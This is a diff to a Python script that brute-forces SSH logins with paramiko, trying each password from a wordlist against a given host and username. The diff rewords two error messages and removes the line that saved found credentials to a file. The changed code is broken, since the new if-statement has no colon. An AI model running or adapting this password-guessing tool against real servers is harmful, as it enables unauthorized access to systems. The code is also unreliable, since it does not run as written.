@@ -18,11 +18,11 @@ def ssh_open(hostname,username,password):
             client.connect(hostname = hostname,username = username,password= password,timeout=timeout )
            
     except socket.timeout:
-        print(f"{RED} !!![host]: {hostname} Hostname is unreachable,timed out {RESET}")
+        print(f"{RED} [host]: {hostname} Hostname not found {RESET}")
         return False
        
     except paramiko.AuthenticationException:
-        print(f"{RED} !!![username and password]: invalid credentials for {username}:{password} ")
+        print(f"{RED} !!![username and password]: false username and password combo {username}:{password} ")
         return False
     except paramiko.SSHException:
         print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
@@ -48,6 +48,5 @@ if __name__ == '__main__':
     timeout = user_input.timeout
     passlist = open(passlist).read().splitlines()
     for password in passlist:
-        if ssh_open(hostname,username,password):
-            open("credentials.txt", "w").write(f"{username}@{hostname}:{password}")
+        if ssh_open(hostname,username,password)
             break
